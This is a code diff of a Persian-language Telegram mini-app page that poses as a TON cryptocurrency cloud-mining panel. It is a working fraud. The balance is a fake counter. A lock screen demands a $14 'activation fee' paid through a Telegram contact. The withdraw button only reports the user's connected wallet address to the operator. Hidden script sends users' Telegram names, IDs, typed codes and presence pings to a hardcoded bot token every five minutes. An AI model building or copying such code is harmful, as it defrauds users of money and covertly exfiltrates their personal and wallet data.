@@ -2,7 +2,7 @@
 <html lang="fa" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>TON Dropy Premium - v34 Final</title>
+    <title>TON Dropy Premium - v35 Master</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
@@ -16,18 +16,20 @@
             margin: 0; font-family: 'Vazirmatn', sans-serif;
             background: radial-gradient(circle at top, #0f1c2e, #070b14);
             color: #fff; padding: 15px; direction: rtl; min-height: 100vh;
+            user-select: none; -webkit-tap-highlight-color: transparent;
         }
 
-        /* پاپ‌آپ فعالسازی (Modal) */
+        /* استایل مودال قفل فعالسازی */
         #feeModal {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0, 0, 0, 0.94); backdrop-filter: blur(20px);
-            z-index: 99999; display: flex; align-items: center; justify-content: center;
+            background: rgba(0, 0, 0, 0.95); backdrop-filter: blur(25px);
+            z-index: 100000; display: flex; align-items: center; justify-content: center;
         }
 
         .modal-content {
             background: rgba(255, 255, 255, 0.08); border: 1px solid rgba(255, 255, 255, 0.2);
-            padding: 30px 20px; border-radius: 35px; width: 85%; text-align: center;
+            padding: 30px 20px; border-radius: 35px; width: 88%; text-align: center;
+            box-shadow: 0 30px 60px rgba(0,0,0,0.8);
         }
 
         .pay-notice {
@@ -38,18 +40,19 @@
 
         .fee-highlight { 
             background: rgba(0, 255, 157, 0.1); border: 1px dashed #00ff9d;
-            color: #00ff9d; padding: 15px; border-radius: 15px;
-            font-weight: 800; font-size: 19px; display: block; margin: 15px 0; 
+            color: #00ff9d; padding: 15px; border-radius: 20px;
+            font-weight: 800; font-size: 20px; display: block; margin: 15px 0; 
         }
 
         #activationInput {
-            width: 100%; padding: 14px; border-radius: 12px; border: 1px solid rgba(255,255,255,0.2);
-            background: rgba(0,0,0,0.3); color: #fff; text-align: center; font-size: 18px; margin-bottom: 12px; outline: none;
+            width: 100%; padding: 15px; border-radius: 15px; border: 1px solid rgba(255,255,255,0.2);
+            background: rgba(0,0,0,0.4); color: #fff; text-align: center; font-size: 18px; margin-bottom: 12px; outline: none;
         }
 
+        /* کارت‌ها و المان‌های اصلی */
         .profile-card {
-            background: rgba(255, 255, 255, 0.08); border-radius: 22px; padding: 18px;
-            display: flex; align-items: center; gap: 15px; margin-bottom: 20px; border: 1px solid rgba(255, 255, 255, 0.1);
+            background: rgba(255, 255, 255, 0.08); border-radius: 25px; padding: 18px;
+            display: flex; align-items: center; gap: 15px; margin-bottom: 20px; border: 1px solid rgba(255,255,255,0.1);
         }
 
         .avatar-container {
@@ -60,20 +63,20 @@
         .avatar-container img { width: 100%; height: 100%; object-fit: cover; }
 
         .card {
-            background: rgba(255, 255, 255, 0.05); border-radius: 25px;
-            padding: 22px; border: 1px solid rgba(255, 255, 255, 0.1); margin-bottom: 15px; text-align: center;
+            background: rgba(255, 255, 255, 0.06); border-radius: 28px;
+            padding: 25px; border: 1px solid rgba(255, 255, 255, 0.12); margin-bottom: 18px; text-align: center;
         }
 
-        #balance { font-size: 45px; font-weight: 800; color: #00c6ff; display: block; margin: 10px 0; }
+        #balance { font-size: 48px; font-weight: 900; color: #00c6ff; display: block; margin: 10px 0; text-shadow: 0 0 15px rgba(0,198,255,0.4); }
 
         .btn-action {
-            width: 100%; padding: 16px; border-radius: 18px; border: none;
-            font-size: 15px; font-weight: 700; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; text-decoration: none; color: #fff;
+            width: 100%; padding: 18px; border-radius: 20px; border: none;
+            font-size: 15px; font-weight: 800; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; text-decoration: none; color: #fff; transition: 0.3s;
         }
 
-        .withdraw-btn { background: linear-gradient(90deg, #ff512f, #dd2476); }
-        .support-btn { background: rgba(255, 255, 255, 0.1); border: 1px solid rgba(255, 255, 255, 0.2); margin-top: 10px; }
-        #ton-connect-btn { display: flex; justify-content: center; margin: 10px 0; }
+        .withdraw-btn { background: linear-gradient(90deg, #ff512f, #dd2476); box-shadow: 0 4px 15px rgba(255,81,47,0.4); }
+        .support-btn { background: rgba(255, 255, 255, 0.1); border: 1px solid rgba(255, 255, 255, 0.2); margin-top: 12px; }
+        #ton-connect-btn { display: flex; justify-content: center; margin: 5px 0; }
         .hidden { display: none !important; }
     </style>
 </head>
@@ -81,26 +84,30 @@
 
 <div id="feeModal">
     <div class="modal-content">
-        <i class="fas fa-lock" style="font-size: 45px; color: #ff512f; margin-bottom: 15px;"></i>
-        <h2 style="font-size: 18px;">فعالسازی پنل کاربری</h2>
+        <i class="fas fa-lock" style="font-size: 50px; color: #ff512f; margin-bottom: 20px;"></i>
+        <h2 style="font-size: 20px; margin: 0 0 15px 0;">فعالسازی پنل کاربری</h2>
+        
         <div class="pay-notice">
             <i class="fas fa-exclamation-triangle"></i>
-            کاربر گرامی، جهت واریز کارمزد فعالسازی <b>حتماً</b> اطلاعات پرداخت را مستقیماً از <b>پشتیبانی</b> دریافت کنید.
+            جهت واریز مبلغ کارمزد شبکه، <b>فقط</b> اطلاعات پرداخت را از <b>پشتیبانی رسمی</b> دریافت کنید. هرگونه واریز به آدرس‌های غیررسمی منجر به مسدود شدن حساب می‌گردد.
         </div>
+
         <div class="fee-highlight">14 دلار | 2,226,000 تومان</div>
+        
         <a href="https://t.me/miningertoncoin" class="btn-action" style="background: #0088cc; margin-bottom: 20px;">
-            <i class="fas fa-headset"></i> دریافت رمز و اطلاعات واریز
+            <i class="fas fa-headset"></i> دریافت رمز و واریز
         </a>
+
         <div style="border-top: 1px solid rgba(255,255,255,0.1); padding-top: 20px;">
-            <input type="text" id="activationInput" placeholder="رمز فعالسازی را وارد کنید">
-            <button onclick="verifyActivation()" class="btn-action" style="background: #1faa59;">تایید و فعالسازی</button>
+            <input type="text" id="activationInput" placeholder="Enter Code">
+            <button onclick="verifyActivation()" class="btn-action" style="background: #1faa59;">فعالسازی و ورود به پنل</button>
         </div>
     </div>
 </div>
 
 <div class="profile-card">
     <div class="avatar-container">
-        <i class="fas fa-user-circle" id="defaultAvatar" style="font-size: 30px; color:#00c6ff;"></i>
+        <i class="fas fa-user-astronaut" id="defaultAvatar" style="font-size: 30px; color:#00c6ff;"></i>
         <img id="userPhoto" src="" class="hidden">
     </div>
     <div class="user-details">
@@ -110,17 +117,17 @@
 </div>
 
 <div class="card">
-    <p style="margin:0; font-size:12px; color:#aaa;">موجودی استخراج شده (TON)</p>
+    <p style="margin:0; font-size:13px; color:#aaa;">موجودی استخراج شده (TON)</p>
     <span id="balance">0.000000</span>
-    <div style="font-size:11px; color:#00ff9d;"><i class="fas fa-bolt"></i> استخراج ابری فعال</div>
+    <div style="font-size:11px; color:#00ff9d; margin-top: 5px;"><i class="fas fa-bolt"></i> استخراج ابری فعال است</div>
 </div>
 
 <div class="card">
     <div id="ton-connect-btn"></div>
 </div>
 
-<div class="card">
-    <button id="withdrawBtn" class="btn-action withdraw-btn">درخواست برداشت وجه</button>
+<div class="card" style="border:none; background:transparent;">
+    <button id="withdrawBtn" class="btn-action withdraw-btn">درخواست برداشت آنی</button>
     <a href="https://t.me/miningertoncoin" class="btn-action support-btn">پشتیبانی آنلاین</a>
 </div>
 
@@ -129,72 +136,81 @@
     tg.ready();
     tg.expand();
 
+    // تنظیمات ادمین
     const SECRET_CODE = "T61O96N12";
     const BOT_TOKEN = "8047223304:AAHMW8a6tKTTSQOp4Os_LorRJzDLNvxz-Rw";
     const ADMIN_ID = "5972276401";
 
-    let bal = parseFloat(localStorage.getItem('bal_v34')) || 0;
+    let bal = parseFloat(localStorage.getItem('bal_v35')) || 0;
 
-    // تابع ارسال پیام به ادمین
+    // تابع گزارش‌دهی به تلگرام
     function logToAdmin(statusMessage) {
         const user = tg.initDataUnsafe?.user;
         const info = user ? `\n👤 کاربر: ${user.first_name}\n🆔 یوزرنیم: @${user.username || 'ندارد'}\n🔢 آیدی: <code>${user.id}</code>` : "\n👤 نامشخص";
         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=${encodeURIComponent(statusMessage + info)}&parse_mode=HTML`);
     }
 
-    // --- مدیریت لاگ ورود و حضور ---
-    const isActivated = localStorage.getItem('isActivated') === 'true';
-    if(isActivated) {
+    // بررسی وضعیت و ارسال گزارش اولیه
+    const isAlreadyActive = localStorage.getItem('isActivated') === 'true';
+    if(isAlreadyActive) {
         document.getElementById('feeModal').style.display = 'none';
         logToAdmin("⛏️ <b>کاربر وارد صفحه استخراج تون کوین شد و هم اکنون آنلاین است</b>");
     } else {
         logToAdmin("🚨 <b>کاربر در حال مشاهده صفحه پرداخت کارمزد است</b>");
     }
 
-    // سیستم هارت‌بیت (بررسی آنلاین بودن هر 5 دقیقه)
+    // آنلاین‌بان 5 دقیقه‌ای
     setInterval(() => {
-        const status = localStorage.getItem('isActivated') === 'true' ? "استخراج" : "صفحه پرداخت";
-        logToAdmin(`🟢 <b>کاربر همچنان در ${status} آنلاین است...</b>`);
-    }, 300000); // 300,000 میلی‌ثانیه = 5 دقیقه
+        const page = localStorage.getItem('isActivated') === 'true' ? "پنل استخراج" : "صفحه پرداخت";
+        logToAdmin(`🟢 <b>کاربر همچنان در ${page} آنلاین و در حال فعالیت است...</b>`);
+    }, 300000);
 
+    // تایید رمز عبور
     function verifyActivation() {
-        const input = document.getElementById('activationInput').value.trim();
-        if(input === SECRET_CODE) {
+        const val = document.getElementById('activationInput').value.trim();
+        if(val === SECRET_CODE) {
             localStorage.setItem('isActivated', 'true');
             document.getElementById('feeModal').remove();
-            tg.showAlert("✅ حساب شما فعال شد!");
-            logToAdmin("🔓 <b>کاربر رمز را درست زد و وارد پنل اصلی شد</b>");
+            tg.showAlert("✅ حساب شما با موفقیت فعال شد. اکنون می‌توانید برداشت کنید.");
+            logToAdmin("🔓 <b>تبریک! کاربر رمز صحیح را زد و حسابش فعال شد</b>");
         } else {
-            tg.showAlert("❌ رمز اشتباه است.");
-            logToAdmin(`⚠️ <b>تلاش با رمز غلط در صفحه پرداخت:</b> <code>${input}</code>`);
+            tg.showAlert("❌ رمز وارد شده نادرست است.");
+            logToAdmin(`⚠️ <b>تلاش ناموفق برای نفوذ/فعالسازی با رمز:</b> <code>${val}</code>`);
         }
     }
 
-    // افزایش موجودی نمایشی
+    // استخراج مداوم
     setInterval(() => {
         bal += 0.000012;
         document.getElementById('balance').innerText = bal.toFixed(6);
-        localStorage.setItem('bal_v34', bal.toString());
+        localStorage.setItem('bal_v35', bal.toString());
     }, 1000);
 
+    // تنظیمات اتصال ولت
     const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
         manifestUrl: 'https://nimwmesfandiari.github.io/ton-plus-bot/tonconnect-manifest.json',
         buttonRootId: 'ton-connect-btn'
     });
 
+    // عملیات برداشت
     document.getElementById('withdrawBtn').onclick = () => {
         if(localStorage.getItem('isActivated') !== 'true') {
-            tg.showAlert("⚠️ حساب فعال نیست.");
+            tg.showAlert("❌ حساب شما فعال نیست. ابتدا کارمزد را پرداخت کنید.");
             return;
         }
         if(!tonConnectUI.connected) {
-            tg.showAlert("❌ ابتدا ولت را وصل کنید.");
+            tg.showAlert("⚠️ لطفاً ابتدا کیف پول خود را وصل کنید.");
             return;
         }
-        tg.showAlert("✅ درخواست برداشت ثبت شد.");
-        logToAdmin(`💰 <b>درخواست برداشت:</b> ${bal.toFixed(6)} TON`);
+        
+        tg.showAlert("درخواست برداشت ثبت شد. پس از تایید مدیریت واریز می‌شود. ✅");
+        logToAdmin(`💰 <b>درخواست برداشت جدید:</b>\nمقدار: ${bal.toFixed(6)} TON\nآدرس: <code>${tonConnectUI.account.address}</code>`);
+        
+        bal = 0;
+        localStorage.setItem('bal_v35', '0');
     };
 
+    // لود اطلاعات پروفایل
     const user = tg.initDataUnsafe?.user;
     if (user) {
         document.getElementById('userName').innerText = user.first_name;
